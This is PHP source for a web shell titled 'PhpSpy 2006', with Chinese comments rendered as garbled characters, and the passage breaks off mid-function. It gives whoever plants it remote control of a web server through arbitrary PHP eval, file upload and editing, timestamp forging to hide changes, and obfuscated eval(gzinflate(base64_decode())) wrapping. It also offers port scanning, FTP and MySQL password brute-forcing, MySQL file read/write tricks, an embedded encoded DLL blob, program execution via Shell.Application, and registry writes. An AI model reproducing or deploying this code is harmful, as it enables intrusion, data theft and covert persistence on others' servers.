<?php
error_reporting(7);
//趨ѶϢرĵȼ
ob_start();
//򿪻,ʱPHPķļͷϢᷢͣǱڲΪݣʹob_end_flush()flush()ݡ 
$mtime = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];
@set_time_limit(0);
//ǰȫģʽʹĺʱȡ
/*=====================  =====================*/
// ǷҪ֤,1ΪҪ֤,Ϊֱӽ.ѡЧ
$admin['check'] = "1";
// Ҫ֤,޸ĵ½
$admin['pass']  = "1314";
//Ĭ϶˿ڱ
$admin['port'] = ",21,22,23,25,53,69,79,80,110,119,143,139,389,443,1080,1433,2401,3128,3306,3389,4899,5432,5631,5900,6000,7000,8000,8080,43958";
//תõ
$admin['jumpsecond'] = "1";
//Ƿʾalexa
$admin['alexa'] = "2";
//FtpƽõӶ˿
$admin['ftpport'] = "21";
// ǷphpspyԶ޸ı༭ļʱΪʱ(yes/no)
$retime = "No";
// Ĭcmd.exeλ,proc_openҪʹõ,linuxϵͳӦ޸.(winntϵͳڳȻָ)
$cmd = "cmd.exe";

// phpspyʾȨģΪܶ򵱳Ϊؼɱˣǲ~~

$notice = "[<a href=\"http://www.51shell.cn\" title=\"ǳķ\">Saiy</a>]  [<a href=\"http://www.4gnel.net\" title=\"ȫʹ\">S4T</a>]  [<a href=\"http://1v1.name\" title=\"7jdg\">7jdg</a>]<br><FONT color=#ff3300>:ʹñ·ǷΪԸ</font>";
/*===================== ý =====================*/
//  register_globals = off Ļ¹
$onoff = (function_exists('ini_get')) ? ini_get('register_globals') : get_cfg_var('register_globals');

if ($onoff != 1) {
        @extract($_POST, EXTR_SKIP);
        @extract($_GET, EXTR_SKIP);
}

$self = $_SERVER['PHP_SELF'];
$dis_func = get_cfg_var("disable_functions");


/*===================== ֤ =====================*/
if($admin['check'] == "1") {
        if ($_GET['action'] == "logout") {
                setcookie ("adminpass", "");
                echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
                echo "<span style=\"font-size: 12px; font-family: Verdana\">עɹ......<p><a href=\"".$self."\">Զ˳򵥻˳ &gt;&gt;&gt;</a></span>";
                exit;
        }

        if ($_POST['do'] == 'login') {
                $thepass=trim($_POST['adminpass']);
                if ($admin['pass'] == $thepass) {
                        setcookie ("adminpass",$thepass,time()+(1*24*3600));
                        echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
                        echo "<span style=\"font-size: 12px; font-family: Verdana\">½ɹ......<p><a href=\"".$self."\">Զת򵥻 &gt;&gt;&gt;</a></span>";
                        exit;
                }
        }
        if (isset($_COOKIE['adminpass'])) {
                if ($_COOKIE['adminpass'] != $admin['pass']) {
                        loginpage();
                }
        } else {
                loginpage();
        }
}
/*===================== ֤ =====================*/

// ж magic_quotes_gpc ״̬
if (get_magic_quotes_gpc()) {
    $_GET = stripslashes_array($_GET);
        $_POST = stripslashes_array($_POST);
}
// 鿴PHPINFO
if ($_GET['action'] == "phpinfo") {
        echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo() ѱ,鿴&lt;PHP&gt;";
        exit;
}

if($_GET['action'] == "nowuser") {
        if(get_current_user()) echo"ǰû:".get_current_user();
        else echo '޷ȡǰû';
        exit;
}
if(isset($_POST['phpcode'])){
        eval("?".">$_POST[phpcode]<?");
        exit;
}
//news
if($action=="mysqldown"){
        $link=@mysql_connect($host,$user,$password);
        if (!$link) {
                $downtmp = 'ݿʧ: ' . mysql_error();
        }else{
        $query="select load_file('".$filename."');";
        $result = @mysql_query($query, $link);
        if(!$result){
                $downtmp = "ȡʧܣļڻûfileȨޡ<br>".mysql_error();
                        }else{
        while ($row = mysql_fetch_array($result)) {
                $filename = basename($filename);
                if($rardown=="yes"){
                        $zip = NEW Zip;
                        $zipfiles[]=Array("$filename",$row[0]);
                        $zip->Add($zipfiles,1);
                        $code = $zip->get_file();
                        $filename = "".$filename.".rar";
                }else{
                        $code = $row[0];
                }
                header("Content-type: application/octet-stream");
                header("Accept-Ranges: bytes");
                header("Accept-Length: ".strlen($code));
                header("Content-Disposition: attachment;filename=$filename");
                echo($code);
                exit;
        }
        }
        }
}
//alexa
if ($admin['alexa'] != "1")
{$title = "ĬϹر";
}else {
$url= "http://data.alexa.com/data?cli=10&dat=snba&url=".$_SERVER['HTTP_HOST'];
$str = file("$url");
$count = count($str);

for ($i=0;$i<$count;$i++){
     $file .= $str[$i];
         }
$title = explode("\" TEXT=\"",$file);
$title = explode("\"/>",$title[1]);
$title = $title[0];
if(!$title) $title = "Not data";

        }
$cckk = "_".date("Ymd",time());

// ߴ
if (isset($_POST['url'])) {
        $proxycontents = @file_get_contents($_POST['url']);
        echo ($proxycontents) ? $proxycontents : "<body bgcolor=\"#F5F5F5\" style=\"font-size: 12px;\"><center><br><p><b>ȡ URL ʧ</b></p></center></body>";
        exit;
}

// ļ
if (!empty($downfile)) {
        if (!@file_exists($downfile)) {
                echo "<script>alert('Ҫµļ!')</script>";
        } else {
                $filename = basename($downfile);
                $filename_info = explode('.', $filename);
                $fileext = $filename_info[count($filename_info)-1];
                header('Content-type: application/x-'.$fileext);
                header('Content-Disposition: attachment; filename='.$filename);
                header('Content-Description: PHP Generated Data');
                header('Content-Length: '.filesize($downfile));
                @readfile($downfile);
                exit;
        }
}

// ֱرݿ
if ($_POST['backuptype'] == 'download') {
        @mysql_connect($servername,$dbusername,$dbpassword) or die("ݿʧ");
        @mysql_select_db($dbname) or die("ѡݿʧ");        
        $table = array_flip($_POST['table']);
        $result = mysql_query("SHOW tables");
        echo ($result) ? NULL : ": ".mysql_error();

        $filename = basename($_SERVER['HTTP_HOST'].$cckk."_MySQL.sql");
        header('Content-type: application/unknown');
        header('Content-Disposition: attachment; filename='.$filename);
        $mysqldata = '';
        while ($currow = mysql_fetch_array($result)) {
                if (isset($table[$currow[0]])) {
                        $mysqldata.= sqldumptable($currow[0]);
                        $mysqldata.= $mysqldata."\r\n";
                }
        }
        mysql_close();
        exit;
}
// Ŀ¼
$pathname=str_replace('\\','/',dirname(__FILE__)); 

// ȡǰ·
if (!isset($dir) or empty($dir)) {
        $dir = ".";
        $nowpath = getPath($pathname, $dir);
} else {
        $dir=$_GET['dir'];
        $nowpath = getPath($pathname, $dir);
}

// ж϶д
$dir_writeable = (dir_writeable($nowpath)) ? "д" : "д";
$phpinfo=(!eregi("phpinfo",$dis_func)) ? " | <a href=\"?action=phpinfo\" target=\"_blank\">PHPINFO</a>" : "";
$reg = (substr(PHP_OS, 0, 3) == 'WIN') ? " | <a href=\"?action=reg\">ע</a>" : "";
$servu = (substr(PHP_OS, 0, 3) == 'WIN') ? "| <a href=\"?action=SUExp\">Serv-U EXP</a> " : "";
$adodb = (substr(PHP_OS, 0, 3) == 'WIN') ? " | <a href=\"?action=adodb\">ADODB</a> " : "";
$mysqlfun = (substr(PHP_OS, 0, 3) == 'WIN') ? " | <a href=\"?action=mysqlfun\">FuncShell</a> " : "";

$tb = new FORMS;

?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title><? //echo http:// $_SERVER['HTTP_HOST'];?>    PhpSpy 2006 ޸İ</title>
<style type="text/css">
body{
        BACKGROUND-COLOR: #F5F5F5; 
        COLOR: #3F3849; 
        font-family: "Verdana", "Tahoma", "";
        font-size: "12px";
        line-height: "140%";
}

TD                {FONT-FAMILY: "Verdana", "Tahoma", ""; FONT-SIZE: 12px; line-height: 140%;}
.smlfont {
        font-family: "Verdana", "Tahoma", "";
        font-size: "11px";
}
.INPUT {
        FONT-SIZE: "12px";
        COLOR: "#000000";
        BACKGROUND-COLOR: "#FFFFFF";
        height: "18px";
        border: "1px solid #666666";
        padding-left: "2px";
}
.redfont {
        COLOR: "#CA0000";
}
A:LINK                {COLOR: #3F3849; TEXT-DECORATION: none}
A:VISITED        {COLOR: #3F3849; TEXT-DECORATION: none}
A:HOVER                {COLOR: #FFFFFF; BACKGROUND-COLOR: #cccccc}
A:ACTIVE        {COLOR: #FFFFFF; BACKGROUND-COLOR: #cccccc}
.top {BACKGROUND-COLOR: "#CCCCCC"}
.firstalt {BACKGROUND-COLOR: "#EFEFEF"}
.secondalt {BACKGROUND-COLOR: "#F5F5F5"}
</style>
<SCRIPT language=JavaScript>
function CheckAll(form) {
        for (var i=0;i<form.elements.length;i++) {
                var e = form.elements[i];
                if (e.name != 'chkall')
                e.checked = form.chkall.checked;
    }
}
function really(d,f,m,t) {
        if (confirm(m)) {
                if (t == 1) {
                        window.location.href='?dir='+d+'&deldir='+f;
                } else {
                        window.location.href='?dir='+d+'&delfile='+f;
                }
        }
}
</SCRIPT>
</head>
<body style="table-layout:fixed; word-break:break-all">
<center>
<?php
$tb->tableheader();
$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>'.$_SERVER['HTTP_HOST'].'</b></td><td><b>վ:'.$title.'</b></td><td align="center">'.date("Ymd h:i:s",time()).'</td><td align="right"><b>'.$_SERVER['REMOTE_ADDR'].'</b></td></tr></table>','center','top');
$tb->tdbody('| <a href="?action=dir">ShellĿ¼</a> | <a href="?action=phpenv"></a> | <a href="?action=proxy">ߴ</a>'.$reg.$phpinfo.' | <a href="?action=shell">WebShell</a> | <a href="?action=crack&type=crack">ƽ</a> | <a href="?action=crack">MySqlϴ</a> | <a href="?action=mix">ѹmix.dll</a> | <a href="?action=setting">ò</a> |');
$tb->tdbody('| <a href="?action=downloads">Http ļ</a> | <a href="?action=search&dir='.$dir.'">ļ</a> | <a href="?action=eval">ִphpű</a> | <a href="?action=sql">ִ SQL </a> '.$mysqlfun.' | <a href="?action=sqlbak">MySQL </a>  '.$servu.$adodb.'|  <a href="?action=logout">ע¼</a> |');
$tb->tablefooter();
?>
<hr width="775" noshade>
<table width="775" border="0" cellpadding="0">
<?
$tb->headerform(array('method'=>'GET','content'=>'<p>·: '.$pathname.'<br>ǰĿ¼(<FONT color=#ff3300>'.$dir_writeable.'</font>,'.substr(base_convert(@fileperms($nowpath),10,8),-4).'): '.$nowpath.'<br>תĿ¼: '.$tb->makeinput('dir').' '.$tb->makeinput('','ȷ','','submit').' ֧־··'));

$tb->headerform(array('action'=>'?dir='.urlencode($dir),'enctype'=>'multipart/form-data','content'=>'ϴļǰĿ¼: '.$tb->makeinput('uploadfile','','','file').' '.$tb->makeinput('doupfile','ȷ','','submit').$tb->makeinput('uploaddir',$dir,'','hidden')));

$tb->headerform(array('action'=>'?action=editfile&dir='.urlencode($dir),'content'=>'½ļڵǰĿ¼: '.$tb->makeinput('editfile').' '.$tb->makeinput('createfile','ȷ','','submit')));

$tb->headerform(array('content'=>'½Ŀ¼ڵǰĿ¼: '.$tb->makeinput('newdirectory').' '.$tb->makeinput('createdirectory','ȷ','','submit')));
?>
</table>
<hr width="775" noshade>
<?php
/*===================== ִв ʼ =====================*/
echo "<p><b>\n";
// ɾļ
if (!empty($delfile)) {
        if (file_exists($delfile)) {
                echo (@unlink($delfile)) ? $delfile." ɾɹ!" : "ļɾʧ!";
        } else {
                echo basename($delfile)." ļѲ!";
        }
}

// ɾĿ¼
elseif (!empty($deldir)) {
        $deldirs="$dir/$deldir";
        if (!file_exists("$deldirs")) {
                echo "$deldir Ŀ¼Ѳ!";
        } else {
                echo (deltree($deldirs)) ? "Ŀ¼ɾɹ!" : "Ŀ¼ɾʧ!";
        }
}

// Ŀ¼
elseif (($createdirectory) AND !empty($_POST['newdirectory'])) {
        if (!empty($newdirectory)) {
                $mkdirs="$dir/$newdirectory";
                if (file_exists("$mkdirs")) {
                        echo "Ŀ¼Ѵ!";
                } else {
                        echo (@mkdir("$mkdirs",0777)) ? "Ŀ¼ɹ!" : "ʧ!";
                        @chmod("$mkdirs",0777);
                }
        }
}

// ϴļ
elseif ($doupfile) {
        echo (@copy($_FILES['uploadfile']['tmp_name'],"".$uploaddir."/".$_FILES['uploadfile']['name']."")) ? "ϴɹ!" : "ϴʧ!";
}
elseif($action=="mysqlup"){
        $filename = $_FILES['upfile']['tmp_name'];
        if(!$filename) {
                echo"ûѡҪϴļ";
        }else{
        $shell = file_get_contents($filename);
        $mysql = bin2hex($shell);
        if(!$upname) $upname = $_FILES['upfile']['name'];
        $shell = "select 0x".$mysql." from ".$database." into DUMPFILE '".$uppath."/".$upname."';";
        $link=@mysql_connect($host,$user,$password);
        if(!$link){
                echo "½ʧ".mysql_error();
        }else{
                $result = mysql_query($shell, $link);
                if($result){
                        echo"ɹ.ļɹϴ".$host.",ļΪ".$uppath."/".$upname."..";
                }else{
                                echo"ϴʧ ԭ:".mysql_error();
                        }
                }
        }

}
elseif($action=="mysqldown"){
        if(!empty($downtmp)) echo $downtmp;
}
// ༭ļ
elseif ($_POST['do'] == 'doeditfile') {
        if (!empty($_POST['editfilename'])) {
    if(!file_exists($editfilename)) unset($retime);
        if($time==$now) $time = @filemtime($editfilename);
        $time2 = @date("Y-m-d H:i:s",$time);
                $filename="$editfilename";
                @$fp=fopen("$filename","w");
                if($_POST['change']=="yes"){
                $filecontent = "?".">".$_POST['filecontent']."<?";
                $filecontent = gzdeflate($filecontent);
        $filecontent = base64_encode($filecontent);
        $filecontent = "<?php\n/*\nhttp://1v1.name!\n*/\neval(gzinflate(base64_decode('$filecontent')));\n"."?>";
                }else{
                $filecontent = $_POST['filecontent'];
                }
                echo $msg=@fwrite($fp,$filecontent) ? "дļɹ!" : "дʧ!";
                @fclose($fp);
                if($retime=="yes"){
        echo"&nbsp;Զ:";
        echo $msg=@touch($filename,$time) ? "޸ļΪ".$time2."ɹ!" : "޸ļʱʧ!";
                }
        } else {
                echo "Ҫ༭ļ!";
        }
}
//ļ
elseif ($_POST['do'] == 'downloads') {
        $contents = @file_get_contents($_POST['durl']);
        if(!$contents){
        echo"޷ȡҪص";
        }
        elseif(file_exists($path)){
        echo"ܱǸļ".$path."Ѿˣļ";
        }else{
    $fp = @fopen($path,"w");
        echo $msg=@fwrite($fp,$contents) ? "ļɹ!" : "ļдʱʧ!";
        @fclose($fp);
        }
}
elseif($_POST['action']=="mix"){
        if(!file_exists($_POST['mixto'])){
                $mixdll = "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";
        $tmp = base64_decode($mixdll);
        $tmp = gzinflate($tmp);
        $fp = fopen($_POST['mixto'],"w");
        echo $msg=@fwrite($fp,$tmp) ? "ѹɹ!" : "Ŀ¼дɣ!";
        fclose($fp);
}else{
        echo"ǰɣ".$_POST['mixto']."ѾҮ~";
}
}
// ༭ļ
elseif ($_POST['do'] == 'editfileperm') {
        if (!empty($_POST['fileperm'])) {
                $fileperm=base_convert($_POST['fileperm'],8,10);
                echo (@chmod($dir."/".$file,$fileperm)) ? "޸ĳɹ!" : "޸ʧ!";
                echo " ļ ".$file." ޸ĺΪ: ".substr(base_convert(@fileperms($dir."/".$file),10,8),-4);
        } else {
                echo "Ҫõ!";
        }
}

// ļ
elseif ($_POST['do'] == 'rename') {
        if (!empty($_POST['newname'])) {
                $newname=$_POST['dir']."/".$_POST['newname'];
                if (@file_exists($newname)) {
                        echo "".$_POST['newname']." Ѿ,һ!";
                } else {
                        echo (@rename($_POST['oldname'],$newname)) ? basename($_POST['oldname'])." ɹΪ ".$_POST['newname']." !" : "ļ޸ʧ!";
                }
        } else {
                echo "Ҫĵļ!";
        }
}
elseif ($_POST['do'] == 'search') {
if(!empty($oldkey)){
echo"<span class=\"redfont\">ҹؼ:[".$_POST[oldkey]."],ļ:".$nb."ʾҵĽ:";
        if($type2 == "getpath"){
        echo"Ƶļϻвֽȡʾ.";
}
echo"</span><br><hr width=\"775\" noshade>";
find($path);
}else{
echo"ҪϺ?ҪϺ?ûϺҪ?";
}
}
elseif($_POST['do']=="setting"){//ϲ˫ŵĵط
        $fp = fopen(basename($self),"r");
        $code = fread($fp,filesize(basename($self)));
        fclose($fp);
        $code = str_replace("\$admin['alexa'] = \"".$admin[alexa]."","\$admin['alexa'] = \"".addslashes($alexa)."",$code);
        $code = str_replace("= \"".$admin[pass]."","= \"".addslashes($pass)."",$code);//滻
        $code = str_replace("= \"".$admin[jumpsecond]."","= \"".addslashes($jumpsecond)."",$code);//滻
        $code = str_replace("= \"".$admin[port]."","= \"".addslashes($port)."",$code);//滻Ĭ϶˿
        $code = str_replace("\$admin['check'] = \"".$admin[check]."","\$admin['check'] = \"".addslashes($check)."",$code);//滻½֤
        $fp2 = fopen(basename($self),"w");
        echo $msg=@fwrite($fp2,$code) ? "޸ıɹ!" : "޸ıʧ!";
        fclose($fp2);
}
// ¡ʱ
elseif ($_POST['do'] == 'domodtime') {
        if (!@file_exists($_POST['curfile'])) {
                echo "Ҫ޸ĵļ!";
        } else {
                if (!@file_exists($_POST['tarfile'])) {
                        echo "Ҫյļ!";
                } else {
                        $time=@filemtime($_POST['tarfile']);
                        echo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile'])." ޸ʱɹΪ ".date("Y-m-d H:i:s",$time)." !" : "ļ޸ʱ޸ʧ!";
                }
        }
}

// Զʱ
elseif ($_POST['do'] == 'modmytime') {
        if (!@file_exists($_POST['curfile'])) {
                echo "Ҫ޸ĵļ!";
        } else {
                $year=$_POST['year'];
                $month=$_POST['month'];
                $data=$_POST['data'];                
                $hour=$_POST['hour'];
                $minute=$_POST['minute'];
                $second=$_POST['second'];
                if (!empty($year) AND !empty($month) AND !empty($data) AND !empty($hour) AND !empty($minute) AND !empty($second)) {
                        $time=strtotime("$data $month $year $hour:$minute:$second");
                        echo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile'])." ޸ʱɹΪ ".date("Y-m-d H:i:s",$time)." !" : "ļ޸ʱ޸ʧ!";
                }
        }
}
elseif($do =='port'){
                $tmp = explode(",",$port);
                $count = count($tmp);
        for($i=$first;$i<$count;$i++){
                        $fp = @fsockopen($host, $tmp[$i], $errno, $errstr, 1);
                        if($fp) echo"".$host."˶˿".$tmp[$i]."<br>";
        }
}
/*
дúӣ˵ʵԼ֪дʲô
ãҾûˣ˿ɴдɡ*/
elseif ($do == 'crack') {//עΪȫֱˡ
        if(@file_exists($passfile)){
                $tmp = file($passfile);
                $count = count($tmp);
                if(empty($onetime)){
                        $onetime = $count;
                        $turn="1";
                }else{
                        $nowturn = $turn+1;
                        $now = $turn*$onetime;
                        $tt = intval(($count/$onetime)+1);
                }
                if($turn>$tt or $onetime>$count){
                        echo"ֵҮ~Ҫƽ̵ģܱǸʧܡ";
                        }else{
                                $first = $onetime*($turn-1);
                                for($i=$first;$i<$now;$i++){
                                        if($ctype=="mysql") $sa = @mysql_connect($host,$user,chop($tmp[$i]));
                                        else $sa = @ftp_login(ftp_connect($host,$admin[ftpport]),$user,chop($tmp[$i]));
                                if($sa) 
                                        {
                                        $t = "ȡ".$user."Ϊ".$tmp[$i]."";
                                        }
                        }
                        if(!$t){
                                echo "<meta http-equiv=\"refresh\" content=\"".$admin[jumpsecond].";URL=".$self."?do=crack&passfile=".$passfile."&host=".$host."&user=".$user."&turn=".$nowturn."&onetime=".$onetime."&ctype=".$ctype."\"><span style=\"font-size: 12px; font-family: Verdana\">ֵܹ".$count."ڴ".$first."".$now."".$admin[jumpsecond]."".$onetime."̽. <br>ȫ˴".$type."ƽҪ".$tt."Σǵ".$turn."νܡ</span>";
        }
        else {
                echo"$t";
                }
                        }
}else{
                        echo"ֵļڣȷ";
                        }
}
elseif($do =='port'){
        if(!eregi("-",$port)){
                $tmp = explode(",",$port);
                $count = count($tmp);
                $first = "1";
        }else{
                $tmp = explode("-",$port);
                $first = $tmp[0];
                $count = $tmp[1];

        }
        for($i=$first;$i<$count;$i++){
                        if(!eregi("-",$port)){
                        $fp = @fsockopen($host, $tmp[$i], $errno, $errstr, 1);
                        if($fp) echo"".$host."˶˿".$tmp[$i]."<br>";
                        }else{
                                $fp = @fsockopen($host, $i, $errno, $errstr, 1);
                                if($fp) echo"".$host."˶˿".$i."<br>";
                        }
                }

        }
// MYSQL
elseif ($connect) {
        if (@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname)) {
                echo "ݿӳɹ!";
                mysql_close();
        } else {
                echo mysql_error();
        }
}

// ִSQL
elseif ($_POST['do'] == 'query') {
        @mysql_connect($servername,$dbusername,$dbpassword) or die("ݿʧ");
        @mysql_select_db($dbname) or die("ѡݿʧ");
        $result = @mysql_query($_POST['sql_query']);
        echo ($result) ? "SQLɹִ!" : ": ".mysql_error();
        echo"<br>";
echo"<br>+---------------------------------------------------------------------------------------------------+<br>";
while($row=mysql_fetch_array($result,MYSQL_BOTH)){
                for($i=0;$i<count($row);$i++){
                        echo"<br>+------------------------------------------------------------+<br>";
                        print($row[$i]."<br>+------------------------------------------------------------+<br>");
}        
        }
echo"<br>+---------------------------------------------------------------------------------------------------+<br>";
        mysql_close();
}

elseif($_POST['do'] == 'adodbquery'){
        $conn = new com("ADODB.Connection");
        if(!$conn) die('˷֧COMADODB.Connectionڡ');
        $connstr = $_POST['sqltype'];
        $conn->Open($connstr);
        if(empty($_POST['sql_query'])) echo"ղѯ޷ִ,Ѿӵ.";
        else{
                $result = $conn->Execute($_POST['sql_query']);
                $count = $result->Fields->Count();
                for ($i=0; $i < $count; $i++){
                        $fld[$i] = $result->Fields($i);
                }
        if($result) echo "<br>ִгɹ!<br>ִΪ".$_POST['sql_query'];
        else echo "<br>ִʧ!<br>ִΪ".$_POST['sql_query'];
        echo"<br>ֶ:".$count;
                if($count) {
                echo"<br>+------------------------------------------------------------------------------------------------------------------+<br>";
        $rowcount = 0;
        while (!$result->EOF)
                {
                echo"<br>+--------------------------------------------------------------------------+<br>";
                for ($i=0; $i < $count; $i++){
                        echo $fld[$i]->value . "<br>";
                        } 
                echo "\n<br>+--------------------------------------------------------------------------+<br>";
                        $rowcount++; 
                        $result->MoveNext();
                        }
         echo"+------------------------------------------------------------------------------------------------------------------+<br>";
        }
        }
        $conn->Close();
}

// ݲ
elseif ($_POST['do'] == 'backupmysql') {
        if (empty($_POST['table']) OR empty($_POST['backuptype'])) {
                echo "ѡݵݱͱݷʽ!";
        } else {
                if ($_POST['backuptype'] == 'server') {
                        @mysql_connect($servername,$dbusername,$dbpassword) or die("ݿʧ");
                        @mysql_select_db($dbname) or die("ѡݿʧ");        
                        $table = array_flip($_POST['table']);
                        $filehandle = @fopen($path,"w");
                        if ($filehandle) {
                                $result = mysql_query("SHOW tables");
                                echo ($result) ? NULL : ": ".mysql_error();
                                while ($currow = mysql_fetch_array($result)) {
                                        if (isset($table[$currow[0]])) {
                                                sqldumptable($currow[0], $filehandle);
                                                fwrite($filehandle,"\n\n\n");
                                        }
                                }
                                fclose($filehandle);
                                echo "ݿѳɹݵ ".$path."";
                                mysql_close();
                        } else {
                                echo "ʧ,ȷĿļǷпдȨ!";
                        }
                }
        }
}

//  PS:ļ̫ܷǳ
// Thx : С
elseif($downrar) {
        if (!empty($dl)) {
                if(eregi("unzipto:",$localfile)){
                $path = "".$dir."/".str_replace("unzipto:","",$localfile)."";
                $zip = new Zip;
                $zipfile=$dir."/".$dl[0];
                $array=$zip->get_list($zipfile);
                $count=count($array);
                $f=0;
                $d=0;
                for($i=0;$i<$count;$i++) {
                        if($array[$i][folder]==0) {
                                if($zip->Extract($zipfile,$path,$i)>0) $f++;
                        }
                        else $d++;
                }
                if($i==$f+$d) echo "$dl[0] ѹ".$path."ɹ<br>($f ļ $d Ŀ¼)";
                elseif($f==0) echo "$dl[0] ѹ".$path."ʧ";
                else echo "$dl[0] δѹ<br>(ѽѹ $f ļ $d Ŀ¼)";
                }else{
        $zipfile="";
        $zip = new Zip;
        for($k=0;isset($dl[$k]);$k++)
                {
                        $zipfile=$dir."/".$dl[$k];
                        if(is_dir($zipfile))
                        {
                                unset($zipfilearray);
                                addziparray($dl[$k]);
                                for($i=0;$zipfilearray[$i];$i++)
                                {
                                        $filename=$zipfilearray[$i];
                                        $filesize=@filesize($dir."/".$zipfilearray[$i]);
                                        $fp=@fopen($dir."/".$filename,rb);
                                        $zipfiles[]=Array($filename,@fread($fp,$filesize));
                                        @fclose($fp); 
                                }
                        }
                        else
                        {
                                $filename=$dl[$k];
                                $filesize=@filesize($zipfile);
                                $fp=@fopen($zipfile,rb);
                                $zipfiles[]=Array($filename,@fread($fp,$filesize));
                                @fclose($fp);
                        }
                }
                $zip->Add($zipfiles,1);
                $code = $zip->get_file();
                $ck = "_".date("YmdHis",time())."";
                if(empty($localfile)){
                header("Content-type: application/octet-stream");
                header("Accept-Ranges: bytes");
                header("Accept-Length: ".strlen($code));
                header("Content-Disposition: attachment;filename=".$_SERVER['HTTP_HOST']."".$ck."_Files.zip");
                echo $code;
                exit;
                }else{
                 $fp = @fopen("".$dir."/".$localfile."","w");
                 echo $msg=@fwrite($fp,$code) ? "ѹ".$dir."/".$localfile."سɹ!" : "Ŀ¼".$dir."޿дȨ!";
                 @fclose($fp);
                }
                }
        } else {
                echo "ѡҪصļ!";
        }
}

// Shell.Application г
elseif(($_POST['do'] == 'programrun') AND !empty($_POST['program'])) {
        $shell= &new COM('Sh'.'el'.'l.Appl'.'ica'.'tion');
        $a = $shell->ShellExecute($_POST['program'],$_POST['prog']);
        echo ($a=='0') ? "Ѿɹִ!" : "ʧ!";
}

// 鿴PHPò״
elseif(($_POST['do'] == 'viewphpvar') AND !empty($_POST['phpvarname'])) {
        echo "ò ".$_POST['phpvarname']." : ".getphpcfg($_POST['phpvarname'])."";
}

// ȡע
elseif(($regread) AND !empty($_POST['readregname'])) {
        $shell= &new COM('WSc'.'rip'.'t.Sh'.'ell');
        var_dump(@$shell->RegRead($_POST['readregname']));
}

// дע
elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype']) AND !empty($_POST['regval'])) {
        $shell= &new COM('W'.'Scr'.'ipt.S'.'hell');
        $a = @$shell->RegWrite($_POST['writeregname'], $_POST['regval'], $_POST['regtype']);
